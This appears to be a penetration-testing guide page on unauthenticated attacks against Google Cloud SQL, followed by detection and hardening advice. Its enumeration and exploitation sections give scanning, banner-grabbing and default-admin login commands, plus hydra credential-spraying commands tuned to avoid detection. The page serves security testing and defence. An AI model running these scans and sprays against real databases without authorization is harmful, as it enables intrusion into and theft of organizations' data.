---
cstg_id: CSTG-GCP-CLOUD-SQL-UNAUTH
title: "GCP Cloud Sql - Unauthenticated Access"
provider: gcp
service: cloud-sql
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - nmap
  - masscan
  - mysql client
  - psql client
  - sqlcmd
  - shodan
  - censys
  - hydra
references:
  - "https://cloud.google.com/sql/docs/mysql/connect-overview"
  - "https://cloud.google.com/sql/docs/mysql/authorize-networks"
  - "https://cloud.google.com/sql/docs/mysql/configure-ssl-instance"
  - "https://cloud.google.com/sql/docs/mysql/connect-auth-proxy"
  - "https://cloud.google.com/sql/docs/mysql/private-ip"
  - "https://www.shodan.io/search?query=product%3AMySQL"
license: CC BY-SA 4.0
---

## Summary

Cloud SQL is the Google Cloud managed relational database service for MySQL, PostgreSQL, and SQL Server. Each instance can be assigned a public IPv4 address, a private IP within a VPC, or both. When a public IP is enabled, the instance is reachable from the public Internet subject only to the instance's *Authorized Networks* allowlist and its SSL/TLS enforcement setting. Misconfiguration of either control exposes the database engine's authentication endpoint to anyone on the Internet.

This page covers what an external party with **no credentials and no access to the target organization's cloud tenant** can discover and attempt against Cloud SQL instances. The attacker objective at this phase is to (1) locate publicly reachable Cloud SQL instances, (2) fingerprint the engine and version, and (3) gain an initial database session through weak/default credentials, credential reuse, or unauthenticated network exposure — establishing a foothold that later phases build on.

Cloud SQL public IP addresses are allocated from Google's published IP ranges and the listener responds on the native database engine port. Nothing about the network layer reveals that the host is a managed service versus a self-hosted database, so standard database reconnaissance applies directly.

## Prerequisites

- No cloud credentials and no membership in the target project or organization.
- Network egress to arbitrary Internet hosts on the relevant database ports:
  - MySQL: TCP 3306
  - PostgreSQL: TCP 5432
  - SQL Server: TCP 1433
- A native client for the candidate engine (`mysql`, `psql`, `sqlcmd`) and standard port scanners.
- Optionally, access to Internet-wide scan datasets (Shodan, Censys) to avoid active scanning of large ranges.

## Enumeration

### Identify candidate hosts

Cloud SQL public IPs live inside Google Cloud's published address space. Google publishes its ranges via the `_cloud-netblocks` SPF-style DNS records and a JSON file; resolving these gives the universe of addresses to consider.

```bash
# Google Cloud published IP ranges (includes Cloud SQL public IPs)
curl -s https://www.gstatic.com/ipranges/cloud.json | jq -r '.prefixes[].ipv4Prefix' | head

# Legacy netblock discovery via DNS TXT records
dig +short TXT _cloud-netblocks.googleusercontent.com
dig +short TXT _cloud-netblocks1.googleusercontent.com
```

Internet-wide scan engines are the lowest-noise way to find live database listeners without scanning yourself:

```text
# Shodan
product:MySQL                      # MySQL listeners
product:PostgreSQL                 # PostgreSQL listeners
"Microsoft SQL Server"             # SQL Server listeners
# Combine with the org's known IP ranges or ASN where possible.

# Censys
services.service_name: MYSQL and location.country: "United States"
services.port: 5432 and services.service_name: POSTGRES
```

When the target organization is known, pivot from its public DNS. Database hosts are frequently referenced by predictable names (`db`, `sql`, `mysql`, `pg`, `database`) or leak in application configuration, error pages, source repositories, and CI logs.

```bash
# Resolve candidate names and check for open DB ports
for h in db sql mysql postgres database; do dig +short "$h.example.com"; done
```

### Probe and fingerprint

```bash
# Fast port discovery across a known range
masscan -p3306,5432,1433 203.0.113.0/24 --rate 1000

# Service/version fingerprinting and default scripts
nmap -Pn -sV -p 3306,5432,1433 <ip>
nmap -Pn -p3306 --script=mysql-info,mysql-empty-password,mysql-enum <ip>
nmap -Pn -p5432 --script=pgsql-brute <ip>
nmap -Pn -p1433 --script=ms-sql-info,ms-sql-empty-password <ip>
```

The MySQL and PostgreSQL handshake banners disclose the engine version before authentication. Cloud SQL versions track Google's supported releases, which helps confirm a managed instance and narrows the CVE surface.

```bash
# MySQL: the greeting packet returns the server version pre-auth
mysql -h <ip> -P 3306 -u root --connect-timeout=5
# Or read the handshake without a full login
nc -v <ip> 3306 | xxd | head

# PostgreSQL: probe whether TLS is required and what auth is requested
psql "host=<ip> port=5432 user=postgres dbname=postgres connect_timeout=5"
```

### Test TLS enforcement

A core Cloud SQL hardening control is *Require SSL*. If TLS is **not** required, the engine accepts cleartext connections, allowing credential interception and trivial protocol fuzzing.

```bash
# Does the server accept a non-TLS connection at all?
mysql -h <ip> --ssl-mode=DISABLED -u root --connect-timeout=5

# PostgreSQL: force no TLS
psql "host=<ip> port=5432 user=postgres sslmode=disable connect_timeout=5"

# Inspect the offered certificate when TLS is available
openssl s_client -connect <ip>:3306 -starttls mysql 2>/dev/null | openssl x509 -noout -subject -issuer -dates
```

The certificate subject/issuer on a managed instance reflects Google's per-instance server CA, which is another strong signal that the host is Cloud SQL rather than a self-managed server.

## Misconfigurations & Findings

- **Authorized Networks set to `0.0.0.0/0`.** The most common and highest-impact finding. The allowlist permits any source IP, so the only remaining barrier is database authentication. This is frequently introduced for convenience ("allow all so the app/dev laptop can connect") and never narrowed.
- **Public IP enabled where private IP would suffice.** Many instances only ever serve in-VPC application traffic but were created with a public IP and an overly broad allowlist.
- **`Require SSL` disabled.** Cleartext authentication and queries are interceptable; credentials can be sniffed on any intermediate hop.
- **Default/built-in administrative accounts with weak or reused passwords.** Cloud SQL provisions a default admin user (`root` for MySQL, `postgres` for PostgreSQL, `sqlserver` for SQL Server). Weak passwords on these accounts grant full database control directly from the Internet.
- **Credential reuse.** Passwords disclosed in unrelated breaches, public code repositories, container images, or CI logs are tried against the exposed listener.
- **Verbose pre-auth banners.** Engine and exact version disclosure aids targeted exploitation of known database-engine CVEs.

Why it matters: a publicly reachable, TLS-optional database with a guessable admin password is a single-step path from anonymous Internet to full read/write access to organizational data. Even when authentication holds, an exposed listener provides a continuous brute-force and zero-day target.

## Exploitation

### Default and weak credential attempts

After fingerprinting the engine, attempt the well-known default administrative account. Cloud SQL requires a password to be set at creation, so empty passwords are uncommon, but weak and reused passwords are not.

```bash
# MySQL default admin
mysql -h <ip> -u root -p

# PostgreSQL default admin
psql "host=<ip> port=5432 user=postgres dbname=postgres"

# SQL Server default admin
sqlcmd -S <ip> -U sqlserver -P '<password>'
```

### Controlled credential spraying

Throttled password spraying against the exposed listener, ideally using a small list of organization-relevant passwords to avoid lockout-like throttling and detection.

```bash
# MySQL
hydra -l root -P passwords.txt -t 4 -W 5 <ip> mysql

# PostgreSQL
hydra -L users.txt -P passwords.txt -t 4 postgres://<ip>

# SQL Server
hydra -l sqlserver -P passwords.txt <ip> mssql
```

### Confirm access and assess blast radius

On a successful login, immediately establish what the session can reach. This output drives the move into the enumeration and post-exploitation phases.

```sql
-- MySQL
SELECT current_user(), @@version, @@hostname;
SHOW DATABASES;
SELECT user, host FROM mysql.user;
SHOW GRANTS;

-- PostgreSQL
SELECT current_user, version();
\l
SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;

-- SQL Server
SELECT SUSER_SNAME(), @@VERSION;
SELECT name FROM sys.databases;
SELECT name, type_desc, is_disabled FROM sys.server_principals;
```

A non-required-SSL instance additionally allows passive credential capture: an on-path observer between any legitimate client and the public IP can read cleartext authentication and query traffic.

For what to do after a valid session is obtained, see [Cloud SQL - Enumeration](../02-services/gcp-cloud-sql-enum.md) and [Cloud SQL - Post-Exploitation](../05-post-exploitation/gcp-cloud-sql-post-exploitation.md).

## Detection & Logging

- **Cloud Audit Logs (Admin Activity)** record the configuration that created the exposure: `cloudsql.instances.create`, `cloudsql.instances.update`, and `cloudsql.instances.patch` events capture the `ipConfiguration.authorizedNetworks` and `requireSsl` settings. An entry adding `0.0.0.0/0` to authorized networks is a high-signal alert.
- **Database engine logs** (MySQL `general_log`/error log, PostgreSQL log, SQL Server error log), surfaced through Cloud Logging, record connection attempts and authentication failures. A burst of failed logins from external addresses indicates spraying.
- Native engine login-failure tables/counters (`performance_schema`, `pg_stat_activity`, SQL Server `sys.event_log`) reveal active brute force.
- Note that **pure network reconnaissance and pre-auth banner grabbing produce no Cloud Audit Log entry** — only successful or failed *authentication* and *configuration changes* are logged. Detection of scanning relies on VPC Flow Logs (private IP) or upstream network telemetry, which does not exist for the managed public endpoint.

Recommended detections:
- Alert on any audit-log change that introduces `0.0.0.0/0` (or any broad CIDR) into `authorizedNetworks`, or that disables `requireSsl`.
- Alert on authentication-failure rate thresholds per instance and per source IP.

## Remediation & Hardening

- **Disable public IP.** Use Private IP and the Cloud SQL Auth Proxy / Private Service Connect for application connectivity. This removes the instance from the Internet entirely.
- **If public IP is required, restrict Authorized Networks** to the minimum specific source addresses; never use `0.0.0.0/0`. Prefer the Auth Proxy, which authenticates with IAM and tunnels over TLS, so no raw IP allowlist is needed.
- **Enforce `Require SSL`/TLS** on every instance so cleartext connections are rejected, and prefer client-certificate or IAM database authentication.
- **Use IAM database authentication** where supported (MySQL, PostgreSQL) to remove static passwords from the engine.
- **Set strong, unique passwords** on built-in admin accounts and rotate them; store secrets in Secret Manager, never in code or images.
- **Apply Organization Policy constraints** such as `constraints/sql.restrictPublicIp` and `constraints/sql.restrictAuthorizedNetworks` to prevent public exposure org-wide.
- **Continuously monitor** with Security Command Center, which flags Cloud SQL instances that have a public IP, allow `0.0.0.0/0`, or do not require SSL.

## Tools

- **nmap / masscan** — port discovery and engine/version fingerprinting via service detection and NSE database scripts.
- **mysql / psql / sqlcmd** — native clients for handshake inspection, TLS-enforcement testing, and login attempts.
- **Shodan / Censys** — Internet-wide indexes of exposed database listeners; identify targets without active scanning.
- **hydra** — throttled credential spraying against MySQL/PostgreSQL/SQL Server.
- **openssl s_client** — inspect the server certificate to confirm a managed Cloud SQL endpoint and TLS posture.

## References

- Cloud SQL connection overview: https://cloud.google.com/sql/docs/mysql/connect-overview
- Authorizing networks for public IP: https://cloud.google.com/sql/docs/mysql/authorize-networks
- Configuring SSL/TLS on an instance: https://cloud.google.com/sql/docs/mysql/configure-ssl-instance
- Cloud SQL Auth Proxy: https://cloud.google.com/sql/docs/mysql/connect-auth-proxy
- Private IP configuration: https://cloud.google.com/sql/docs/mysql/private-ip
- Google Cloud published IP ranges: https://www.gstatic.com/ipranges/cloud.json
